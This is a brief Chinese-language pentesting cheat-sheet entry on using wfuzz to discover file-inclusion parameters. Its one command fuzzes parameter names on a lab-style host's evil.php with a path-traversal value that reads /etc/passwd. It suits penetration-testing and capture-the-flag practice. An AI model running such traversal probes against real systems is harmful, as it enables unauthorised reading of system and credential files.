# Wufzz 实战手册

# fuzz 文件包含

```
sudo wfuzz -u "10.10.10.18/secret/evil.php?FUZZ=../../../../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw 0
```